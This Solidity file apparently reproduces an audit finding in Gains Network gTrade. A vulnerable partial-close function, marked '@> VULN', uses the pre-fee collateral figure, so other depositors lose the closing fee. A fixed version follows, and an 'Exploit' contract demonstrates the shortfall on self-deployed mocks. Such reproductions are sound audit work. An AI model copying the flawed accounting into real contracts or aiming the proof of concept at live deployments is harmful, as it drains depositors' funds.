// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Gains Network gTrade — H-03 (Pashov, 2025-05-26)
    DecreasePositionSizeUtils.updateTradeSuccess passes the pre-fee
    availableCollateralInDiamond into handleTradeValueTransfer after
    realizeTradingFeesOnOpenTrade has already removed closingFeeCollateral
    from the diamond.

    Verbatim vulnerable call (report quote), marked @> VULN.
    Numbers for this partial close (DAI, 18 decimals):
      position collateral in the diamond     1,000
      other depositors' collateral           1,000
      partial collateral / available         400
      positive partial PnL                   150
      collateralSentToTrader                 550
      closing fee                            40
    Bug:    vault is debited 150 (550 - 400). Diamond is left 40 short.
    Fair:   vault is debited 190 (550 - (400 - 40)). Diamond stays whole.
    The trader is credited 550 either way. Other depositors are debited
    40 instead of 0. The control contract subtracts the closing fee.
*/

library ITradingStorage {
    enum PendingOrderType {
        MARKET_OPEN,
        LIMIT_OPEN,
        MARKET_PARTIAL_CLOSE
    }

    struct Id {
        address user;
        uint32 index;
    }

    struct Trade {
        address user;
        uint32 index;
        uint8 collateralIndex;
        uint16 pairIndex;
        uint120 collateralAmount;
        uint24 leverage;
        uint64 openPrice;
        bool long;
        bool isCounterTrade;
    }
}

library ITradingCallbacks {
    struct AggregatorAnswer {
        uint256 orderId;
        uint64 current;
        uint64 price;
    }
}

library IUpdatePositionSizeUtils {
    struct DecreasePositionSizeValues {
        uint256 closingFeeCollateral;
        uint256 newCollateralAmount;
        uint24 newLeverage;
        int256 existingPnlCollateral;
        uint256 availableCollateralInDiamond;
        int256 collateralSentToTrader;
    }
}

contract Dai {
    string public name = "Gains DAI";
    string public symbol = "DAI";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GTokenVault {
    Dai public immutable token;
    uint256 public sent;

    constructor(Dai _token) {
        token = _token;
    }

    function sendAssets(uint256 amount, address to) external {
        sent += amount;
        token.transfer(to, amount);
    }
}

contract GnsDiamondBase {
    Dai public immutable token;
    GTokenVault public immutable vault;
    address public constant FEE_SINK = 0x000000000000000000000000000000000000fEee;

    uint256 public storedCollateral;
    uint256 public otherDeposit;
    uint256 public feesRealized;
    uint256 public vaultDebited;
    uint256 public traderCredited;
    uint256 public otherDebited;
    uint256 public fairVaultDebit;
    uint256 public availablePassed;

    error NotAuthorized();

    constructor(Dai _token, GTokenVault _vault) {
        token = _token;
        vault = _vault;
    }

    function _getMultiCollatDiamond() internal view returns (GnsDiamondBase) {
        return GnsDiamondBase(address(this));
    }

    function fundPosition(uint256 position, uint256 otherAmt) external {
        otherDeposit = otherAmt;
        token.transferFrom(msg.sender, address(this), position + otherAmt);
    }

    function updateTradePosition(
        ITradingStorage.Id memory,
        uint256 newCollateralAmount,
        uint24,
        uint64,
        ITradingStorage.PendingOrderType,
        bool,
        uint64
    ) public {
        storedCollateral = newCollateralAmount;
    }

    function realizeTradingFeesOnOpenTrade(address, uint32, uint256 amount, uint64) public returns (uint256) {
        feesRealized = amount;
        token.transfer(FEE_SINK, amount);
        return amount;
    }

    function receiveCollateralFromVault(uint256 amount) public {
        vaultDebited = amount;
        vault.sendAssets(amount, address(this));
    }

    function transferCollateralTo(address user, uint256 amount) public {
        token.transfer(user, amount);
        traderCredited = amount;
    }

    function transferCollateralToVault(uint256 amount) public {
        token.transfer(address(vault), amount);
    }

    function _finish(int256 sent, uint256 available, uint256 fee) internal {
        fairVaultDebit = uint256(sent - (int256(available) - int256(fee)));
        uint256 left = token.balanceOf(address(this));
        uint256 shouldRemain = storedCollateral + otherDeposit;
        otherDebited = left < shouldRemain ? shouldRemain - left : 0;
    }
}

library TradingCommonUtils {
    function handleTradeValueTransfer(
        ITradingStorage.Trade memory _trade,
        int256 _collateralSentToTrader,
        int256 _availableCollateralInDiamond
    ) internal {
        GnsDiamondBase d = GnsDiamondBase(address(this));
        if (_availableCollateralInDiamond < 0 && _collateralSentToTrader < 0) revert GnsDiamondBase.NotAuthorized();
        if (_collateralSentToTrader > _availableCollateralInDiamond) {
            // @> VULN: availableCollateralInDiamond was not reduced by closingFeeCollateral, so the vault pull is short that fee
            int256 collateralFromGToken = _collateralSentToTrader - _availableCollateralInDiamond;
            d.receiveCollateralFromVault(uint256(collateralFromGToken));
        } else if (_collateralSentToTrader < _availableCollateralInDiamond) {
            d.transferCollateralToVault(uint256(_availableCollateralInDiamond - _collateralSentToTrader));
        }
        if (_collateralSentToTrader > 0) {
            d.transferCollateralTo(_trade.user, uint256(_collateralSentToTrader));
        }
    }
}

contract GnsDiamond is GnsDiamondBase {
    constructor(Dai _token, GTokenVault _vault) GnsDiamondBase(_token, _vault) {}

    function updateTradeSuccess(
        ITradingStorage.Trade memory _existingTrade,
        IUpdatePositionSizeUtils.DecreasePositionSizeValues memory _values,
        ITradingCallbacks.AggregatorAnswer memory _answer
    ) public {
        // 1. Update trade in storage
        _getMultiCollatDiamond().updateTradePosition(
            ITradingStorage.Id(_existingTrade.user, _existingTrade.index),
            _values.newCollateralAmount,
            _values.newLeverage,
            _existingTrade.openPrice, // open price stays the same
            ITradingStorage.PendingOrderType.MARKET_PARTIAL_CLOSE, // don't refresh liquidation params
            _values.existingPnlCollateral > 0,
            _answer.current
        );
        // 2. Realize trading fees and negative pnl (leverage decrease)
        _getMultiCollatDiamond().realizeTradingFeesOnOpenTrade(
            _existingTrade.user,
            _existingTrade.index,
            _values.closingFeeCollateral +
                (_values.collateralSentToTrader < 0 ? uint256(-_values.collateralSentToTrader) : 0), // reduces collateral available in diamond
            _answer.current
        );

        // 3. Handle collateral/pnl transfers
        TradingCommonUtils.handleTradeValueTransfer(
            _existingTrade,
            _values.collateralSentToTrader,
            // pre-fee availableCollateralInDiamond; the closing fee was already realized above
            int256(_values.availableCollateralInDiamond)
        );
        availablePassed = _values.availableCollateralInDiamond;
        _finish(_values.collateralSentToTrader, _values.availableCollateralInDiamond, _values.closingFeeCollateral);
    }
}

contract GnsDiamondFixed is GnsDiamondBase {
    constructor(Dai _token, GTokenVault _vault) GnsDiamondBase(_token, _vault) {}

    function updateTradeSuccess(
        ITradingStorage.Trade memory _existingTrade,
        IUpdatePositionSizeUtils.DecreasePositionSizeValues memory _values,
        ITradingCallbacks.AggregatorAnswer memory _answer
    ) public {
        _getMultiCollatDiamond().updateTradePosition(
            ITradingStorage.Id(_existingTrade.user, _existingTrade.index),
            _values.newCollateralAmount,
            _values.newLeverage,
            _existingTrade.openPrice,
            ITradingStorage.PendingOrderType.MARKET_PARTIAL_CLOSE,
            _values.existingPnlCollateral > 0,
            _answer.current
        );
        _getMultiCollatDiamond().realizeTradingFeesOnOpenTrade(
            _existingTrade.user,
            _existingTrade.index,
            _values.closingFeeCollateral +
                (_values.collateralSentToTrader < 0 ? uint256(-_values.collateralSentToTrader) : 0),
            _answer.current
        );
        // FIX: pass availableCollateralInDiamond - closingFeeCollateral
        uint256 corrected = _values.availableCollateralInDiamond - _values.closingFeeCollateral;
        TradingCommonUtils.handleTradeValueTransfer(
            _existingTrade,
            _values.collateralSentToTrader,
            int256(corrected)
        );
        availablePassed = corrected;
        _finish(_values.collateralSentToTrader, _values.availableCollateralInDiamond, _values.closingFeeCollateral);
    }
}

contract Exploit {
    uint256 public constant POSITION = 1000e18;
    uint256 public constant OTHER = 1000e18;
    uint256 public constant AVAILABLE = 400e18;
    uint256 public constant SENT = 550e18;
    uint256 public constant FEE = 40e18;
    uint256 public constant VAULT_FUND = 1000e18;
    uint256 public constant BUGGY_PULL = 150e18;
    uint256 public constant FAIR_PULL = 190e18;
    address public constant TRADER = 0x000000000000000000000000000000000000bEEF;

    Dai public token;
    GTokenVault public vault;
    GnsDiamond public diamond;

    constructor() {
        token = new Dai();
        vault = new GTokenVault(token);
        diamond = new GnsDiamond(token, vault);
    }

    function run() external {
        token.mint(address(this), POSITION + OTHER + VAULT_FUND);
        token.transfer(address(vault), VAULT_FUND);
        token.approve(address(diamond), POSITION + OTHER);
        diamond.fundPosition(POSITION, OTHER);

        ITradingStorage.Trade memory existingTrade = ITradingStorage.Trade({
            user: TRADER,
            index: 1,
            collateralIndex: 1,
            pairIndex: 0,
            collateralAmount: uint120(POSITION),
            leverage: 5_000,
            openPrice: 1e10,
            long: true,
            isCounterTrade: false
        });
        IUpdatePositionSizeUtils.DecreasePositionSizeValues memory values;
        values.closingFeeCollateral = FEE;
        values.newCollateralAmount = POSITION - AVAILABLE;
        values.newLeverage = 5_000;
        values.existingPnlCollateral = int256(SENT - AVAILABLE);
        values.availableCollateralInDiamond = AVAILABLE;
        values.collateralSentToTrader = int256(SENT);
        ITradingCallbacks.AggregatorAnswer memory answer =
            ITradingCallbacks.AggregatorAnswer({orderId: 1, current: 1.1e10, price: 1.1e10});

        diamond.updateTradeSuccess(existingTrade, values, answer);

        require(token.balanceOf(TRADER) == SENT, "trader credit");
        require(diamond.traderCredited() == SENT, "credited storage");
        require(diamond.vaultDebited() == BUGGY_PULL, "vault debit");
        require(diamond.fairVaultDebit() == FAIR_PULL, "fair vault debit");
        require(diamond.otherDebited() == FEE, "other depositors");
        require(diamond.vaultDebited() != diamond.fairVaultDebit(), "debits match");
        require(diamond.availablePassed() == AVAILABLE, "passed pre-fee available");
        require(token.balanceOf(address(diamond)) + FEE == POSITION - AVAILABLE + OTHER, "diamond short the fee");
    }
}
